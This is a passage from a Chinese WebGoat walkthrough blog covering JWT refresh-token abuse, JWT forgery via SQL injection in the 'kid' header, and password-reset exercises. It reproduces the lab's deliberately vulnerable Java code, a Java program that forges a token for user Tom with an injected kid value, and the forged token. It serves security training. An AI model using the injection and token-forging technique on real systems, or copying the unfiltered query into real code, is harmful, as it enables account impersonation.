<h4 id="Stage-7-1"><a href="#Stage-7-1" class="headerlink" title="Stage 7"></a>Stage 7</h4><p>通常有两种令牌：访问令牌和刷新令牌。 访问令牌用于对服务器进行API调用。 访问令牌的使用寿命有限，这就是刷新令牌的来源。一旦访问令牌不再有效，可以通过呈现刷新令牌向服务器发送请求以获得新的访问令牌。 刷新令牌可以过期，但其寿命要长得多。</p>
<p>从<code>http://127.0.0.1:8080/WebGoat/images/logs.txt</code>可以找到付款链接中存在Tom的jwt token，但是使用后发现token已过期，说明需要刷新该token才能再次使用。</p>
<p>此题目后台代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AssignmentPath(&quot;/JWT/refresh/&quot;)</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;jwt-refresh-hint1&quot;, &quot;jwt-refresh-hint2&quot;, &quot;jwt-refresh-hint3&quot;, &quot;jwt-refresh-hint4&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JWTRefreshEndpoint</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;bm5nhSkxCXZkKRy4&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JWT_PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;bm5n3SkxCX4kKRy4&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; validRefreshTokens = Lists.newArrayList();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里是进行登录，获取访问令牌和刷新令牌</span></span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;login&quot;, consumes = MediaType.APPLICATION_JSON_VALUE, produces = MediaType.APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span></span><br><span class="line">    ResponseEntity <span class="title function_">follow</span><span class="params">(<span class="meta">@RequestBody</span> Map&lt;String, Object&gt; json)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> (String) json.get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> (String) json.get(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;Jerry&quot;</span>.equals(user) &amp;&amp; PASSWORD.equals(password)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.ok(createNewTokens(user));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Object&gt; <span class="title function_">createNewTokens</span><span class="params">(String user)</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; claims = Maps.newHashMap();</span><br><span class="line">        claims.put(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">        claims.put(<span class="string">&quot;user&quot;</span>, user);</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> Jwts.builder()</span><br><span class="line">                .setIssuedAt(<span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis() + TimeUnit.DAYS.toDays(<span class="number">10</span>)))</span><br><span class="line">                .setClaims(claims)</span><br><span class="line">                .signWith(io.jsonwebtoken.SignatureAlgorithm.HS512, JWT_PASSWORD)</span><br><span class="line">                .compact();</span><br><span class="line">        Map&lt;String, Object&gt; tokenJson = Maps.newHashMap();</span><br><span class="line">        <span class="type">String</span> <span class="variable">refreshToken</span> <span class="operator">=</span> RandomStringUtils.randomAlphabetic(<span class="number">20</span>);</span><br><span class="line">        validRefreshTokens.add(refreshToken);</span><br><span class="line">        tokenJson.put(<span class="string">&quot;access_token&quot;</span>, token);</span><br><span class="line">        tokenJson.put(<span class="string">&quot;refresh_token&quot;</span>, refreshToken);</span><br><span class="line">        <span class="keyword">return</span> tokenJson;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用新的访问令牌进行买单</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;checkout&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span></span><br><span class="line">    AttackResult <span class="title function_">checkout</span><span class="params">(<span class="meta">@RequestHeader(&quot;Authorization&quot;)</span> String token)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parse(token.replace(<span class="string">&quot;Bearer &quot;</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line">            <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;Tom&quot;</span>.equals(user)) &#123;</span><br><span class="line">                <span class="keyword">return</span> trackProgress(success().build());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> trackProgress(failed().feedback(<span class="string">&quot;jwt-refresh-not-tom&quot;</span>).feedbackArgs(user).build());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExpiredJwtException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> trackProgress(failed().output(e.getMessage()).build());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> trackProgress(failed().feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).build());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用刷新令牌更新访问令牌，这里存在的漏洞是没有验证访问令牌用户和刷新令牌用户是否一致</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;newToken&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span></span><br><span class="line">    ResponseEntity <span class="title function_">newToken</span><span class="params">(<span class="meta">@RequestHeader(&quot;Authorization&quot;)</span> String token, <span class="meta">@RequestBody</span> Map&lt;String, Object&gt; json)</span> &#123;</span><br><span class="line">        String user;</span><br><span class="line">        String refreshToken;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Jwt&lt;Header, Claims&gt; jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(token.replace(<span class="string">&quot;Bearer &quot;</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">            user = (String) jwt.getBody().get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">            refreshToken = (String) json.get(<span class="string">&quot;refresh_token&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExpiredJwtException e) &#123;</span><br><span class="line">            user = (String) e.getClaims().get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">            refreshToken = (String) json.get(<span class="string">&quot;refresh_token&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (user == <span class="literal">null</span> || refreshToken == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (validRefreshTokens.contains(refreshToken)) &#123;</span><br><span class="line">            validRefreshTokens.remove(refreshToken);</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.ok(createNewTokens(user));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以此题的思路应该是，首先找到用Jerry账户登录，获取刷新token，然后使用刷新token和Tom的访问token进行访问令牌的刷新，获取到新的访问令牌后，进行购物车买单，绕过权限。<br>获取Jerry的刷新令牌。<br><img src="/img/posts/5a305151d1ecce8e769ec11a30667816.png" alt="img"><br>使用Jerry的刷新令牌获取Tom的访问令牌。<br><img src="/img/posts/682d8a8b0e2a857a398b140d0ab8b460.png" alt="img"><br>使用Tom的访问令牌进行买单操作，题目完成。<br><img src="/img/posts/348614cabfc64a6a25dc820096835fb5.png" alt="img"></p>
<h4 id="Stage-8"><a href="#Stage-8" class="headerlink" title="Stage 8"></a>Stage 8</h4><p>本题目的目的是让用户能够仿冒Tom的Token来删除他的微博。</p>
<p>从下面源码进行分析，可以看到JWT的签名盐是从数据库中读取的，但是获取数据库盐的值的地方传入的参数<code>kid</code>并没有进行任何的过滤，这样就可以使用注入来伪造一个JWT的签名盐，从而达到伪造目的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;delete&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@ResponseBody</span></span><br><span class="line">AttackResult <span class="title function_">resetVotes</span><span class="params">(<span class="meta">@RequestParam(&quot;token&quot;)</span> String token)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isEmpty(token)) &#123;</span><br><span class="line">        <span class="keyword">return</span> trackProgress(failed().feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).build());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> String[] errorMessage = &#123;<span class="literal">null</span>&#125;;</span><br><span class="line">            <span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKeyResolver(<span class="keyword">new</span> <span class="title class_">SigningKeyResolverAdapter</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="type">byte</span>[] resolveSigningKeyBytes(JwsHeader header, Claims claims) &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">kid</span> <span class="operator">=</span> (String) header.get(<span class="string">&quot;kid&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DatabaseUtilities.getConnection(webSession);</span><br><span class="line">                        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> connection.createStatement().executeQuery(<span class="string">&quot;SELECT key FROM jwt_keys WHERE id = &#x27;&quot;</span> + kid + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                        <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                            <span class="keyword">return</span> TextCodec.BASE64.decode(rs.getString(<span class="number">1</span>));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                        errorMessage[<span class="number">0</span>] = e.getMessage();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).parse(token);</span><br><span class="line">            <span class="keyword">if</span> (errorMessage[<span class="number">0</span>] != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> trackProgress(failed().output(errorMessage[<span class="number">0</span>]).build());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line">            <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;Jerry&quot;</span>.equals(username)) &#123;</span><br><span class="line">                <span class="keyword">return</span> trackProgress(failed().feedback(<span class="string">&quot;jwt-final-jerry-account&quot;</span>).build());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;Tom&quot;</span>.equals(username)) &#123;</span><br><span class="line">                <span class="keyword">return</span> trackProgress(success().build());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> trackProgress(failed().feedback(<span class="string">&quot;jwt-final-not-tom&quot;</span>).build());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> trackProgress(failed().feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).output(e.toString()).build());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析一下原始Token的内容。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0<span class="selector-class">.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycnkiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0</span><span class="selector-class">.CgZ27DzgVW8gzc0n6izOU638uUCi6UhiOJKYzoEZGE8</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>,<span class="string">&quot;kid&quot;</span>:<span class="string">&quot;webgoat_key&quot;</span>,<span class="string">&quot;alg&quot;</span>:<span class="string">&quot;HS256&quot;</span>&#125;.&#123;<span class="string">&quot;iss&quot;</span>:<span class="string">&quot;WebGoat Token Builder&quot;</span>,<span class="string">&quot;iat&quot;</span>:<span class="number">1524210904</span>,<span class="string">&quot;exp&quot;</span>:<span class="number">1618905304</span>,<span class="string">&quot;aud&quot;</span>:<span class="string">&quot;webgoat.org&quot;</span>,<span class="string">&quot;sub&quot;</span>:<span class="string">&quot;jerry@webgoat.com&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;Jerry&quot;</span>,<span class="string">&quot;Email&quot;</span>:<span class="string">&quot;jerry@webgoat.com&quot;</span>,<span class="string">&quot;Role&quot;</span>:<span class="selector-attr">[<span class="string">&quot;Cat&quot;</span>]</span>&#125;.CgZ27DzgVW8gzc0n6izOU638uUCi6UhiOJKYzoEZGE8</span><br></pre></td></tr></table></figure>

<p>也看当前的用户是Jerry，首先我们将用户名改为Tom，然后修改第一部分中kid的值为<code>webgoat_key&#39; and &#39;1&#39;=&#39;2&#39; union select id FROM jwt_keys WHERE id=&#39;webgoat_key</code>，即当查询表jwt_keys时，又将输入参数kid的值webgoat_key返回给jwt token当做签名盐使用。构造代码。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> dd.webgoat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.time.Duration;</span><br><span class="line"><span class="keyword">import</span> java.time.Instant;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jwts;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JWTToken_S8</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JWT_PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;webgoat_key&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">createJWTToken</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//&#123;&quot;iss&quot;:&quot;WebGoat Token Builder&quot;,&quot;iat&quot;:1524210904,&quot;exp&quot;:1618905304,&quot;aud&quot;:&quot;webgoat.org&quot;,</span></span><br><span class="line">        <span class="comment">//&quot;sub&quot;:&quot;jerry@webgoat.com&quot;,&quot;username&quot;:&quot;Tom&quot;,&quot;Email&quot;:&quot;jerry@webgoat.com&quot;,&quot;Role&quot;:[&quot;Cat&quot;]&#125;</span></span><br><span class="line">        <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> Jwts.claims().setIssuedAt(Date.from(Instant.now().plus(Duration.ofDays(<span class="number">10</span>))));</span><br><span class="line">        claims.put(<span class="string">&quot;iss&quot;</span>, <span class="string">&quot;WebGoat Token Builder&quot;</span>);</span><br><span class="line">        claims.put(<span class="string">&quot;exp&quot;</span>, <span class="number">1618905304</span>);</span><br><span class="line">        claims.put(<span class="string">&quot;aud&quot;</span>, <span class="string">&quot;webgoat.org&quot;</span>);</span><br><span class="line">        claims.put(<span class="string">&quot;sub&quot;</span>, <span class="string">&quot;jerry@webgoat.com&quot;</span>);</span><br><span class="line">        claims.put(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;Tom&quot;</span>);</span><br><span class="line">        claims.put(<span class="string">&quot;Email&quot;</span>, <span class="string">&quot;jerry@webgoat.com&quot;</span>);</span><br><span class="line">        ArrayList&lt;String&gt; roleList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">        roleList.add(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        claims.put(<span class="string">&quot;Role&quot;</span>, roleList);</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> Jwts.builder().setClaims(claims).setHeaderParam(<span class="string">&quot;typ&quot;</span>, <span class="string">&quot;JWT&quot;</span>)</span><br><span class="line">                .setHeaderParam(<span class="string">&quot;kid&quot;</span>, <span class="string">&quot;webgoat_key&#x27; and &#x27;1&#x27;=&#x27;2&#x27; union select id FROM jwt_keys WHERE id=&#x27;webgoat_key&quot;</span>)</span><br><span class="line">                .signWith(io.jsonwebtoken.SignatureAlgorithm.HS256, JWT_PASSWORD).compact();</span><br><span class="line">        System.out.println(token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        JWTToken_S8.createJWTToken();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//output :  eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleScgYW5kICcxJz0nMicgdW5pb24gc2VsZWN0IGlkIEZST00gand0X2tleXMgV0hFUkUgaWQ9J3dlYmdvYXRfa2V5IiwiYWxnIjoiSFMyNTYifQ.eyJpYXQiOjE1Mjk1Njk1MzYsImlzcyI6IldlYkdvYXQgVG9rZW4gQnVpbGRlciIsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiVG9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19.q_V6nGy5kxtGEpTJWp4EET7QuK7L2C2G0R6txUP2Dag</span></span><br></pre></td></tr></table></figure>

<p>按照下图发送包，题目完成。</p>
<p><img src="/img/posts/38f1014b79fdfdd08d66442d3ac6a4ac.png" alt="img"></p>
<h3 id="Password-reset"><a href="#Password-reset" class="headerlink" title="Password reset"></a>Password reset</h3><p>密码重置</p>
<h4 id="Stage-2-question"><a href="#Stage-2-question" class="headerlink" title="Stage 2 question"></a>Stage 2 question</h4><p>这道题目好像有问题，webwolf里接收不到邮件。</p>
<h4 id="Stage-4-2"><a href="#Stage-4-2" class="headerlink" title="Stage 4"></a>Stage 4</h4><p>由于设置的安全问题太简单，最简单的一个暴力破解就行了，具体看图。<br><img src="/img/posts/7bcd8656124eb85f9b0dab374cc9a08e.png" alt="img"></p>
<p>同时官网给出了一个链接，<a href="http://goodsecurityquestions.com/">http://goodsecurityquestions.com/</a> ，里面说明了如何设置一个好的安全问题。</p>
<h4 id="Stage-5-question"><a href="#Stage-5-question" class="headerlink" title="Stage 5 question"></a>Stage 5 question</h4><p>在此题目中，WebGoat给出了一个密码重置链接的开发建议：</p>
<ol>
<li>在创建密码重置链接时，您需要确保：</li>
<li>这是一个随机令牌的独特链接</li>
<li>它只能使用一次</li>
<li>该链接仅适用于一个小时</li>
<li>使用随机令牌发送链接意味着攻击者无法通过开始阻止用户而对您的网站启动简单的DOS攻击。 该链接不应再多使用一次，这使得无法再次更改密码。 超时是限制攻击窗口所必需的，通过链接为攻击者提供了很多可能性。</li>
</ol>
<p>这道题目同样接受不到邮件，跳过。</p>

    </div>
    
    <div class="post-footer">
        <div>
            
                转载声明：商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="/" target="_blank">Ljjyy.com</a>
            
        </div>
        <div>
            
        </div>
    </div>
</article>

<div class="article-nav prev-next-wrap clearfix">
    
        <a href="/archives/2018/09/100040.html" class="pre-post btn btn-default" title='Web安全攻防靶场之WebGoat(二)'>
            <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
            <span class="hidden-xs">Web安全攻防靶场之WebGoat(二)</span>
        </a>
    
    
        <a href="/archives/2018/09/100038.html" class="next-post btn btn-default" title='漏洞及渗透练习平台'>
            <span class="hidden-lg">下一篇</span>
            <span class="hidden-xs">漏洞及渗透练习平台</span><i class="fa fa-angle-right fa-fw"></i>
        </a>
    
</div>


    <div id="comments">
        
	
    <div id="vcomments" class="valine"></div>
    
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="/assets/valine.min.js"></script>


    <script>
        new Valine({
            av: AV,
            el: '#vcomments',
            appId: '5MzTXYXkt03k101j0PmSDN34-gzGzoHsz',
            appKey: 'iwjYgwno6qj3wtDVVSbe8nYQ',
            placeholder: '说点什么吧',
            notify: false,
            verify: true,
            avatar: 'mm',
            meta: 'nick,mail'.split(','),
            pageSize: '10',
            path: window.location.pathname,
            lang: 'zh-CN'.toLowerCase()
        })
    </script>


    </div>





                </main>
                
                    <aside id="article-toc" role="navigation" class="col-md-4">
    <div class="widget">
        <h3 class="title">文章目录</h3>
        
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2"><span class="toc-text">部署</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8release%E7%89%88%E6%9C%AC%E9%83%A8%E7%BD%B2"><span class="toc-text">使用release版本部署</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-text">使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-text">Introduction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WebGoat"><span class="toc-text">WebGoat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebWolf"><span class="toc-text">WebWolf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#General"><span class="toc-text">General</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-Basics"><span class="toc-text">HTTP Basics</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage-2"><span class="toc-text">Stage 2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage-3"><span class="toc-text">Stage 3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-Proxies"><span class="toc-text">HTTP Proxies</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Injection-Flaws"><span class="toc-text">Injection Flaws</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection"><span class="toc-text">SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage7"><span class="toc-text">Stage7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage8"><span class="toc-text">Stage8</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-advanced"><span class="toc-text">SQL Injection(advanced)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage3"><span class="toc-text">Stage3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage5"><span class="toc-text">Stage5</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-mitigation"><span class="toc-text">SQL Injection(mitigation)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage8-question"><span class="toc-text">Stage8 question</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE"><span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage-3-1"><span class="toc-text">Stage 3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage-4"><span class="toc-text">Stage 4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xxe-%E7%9A%84-ddos"><span 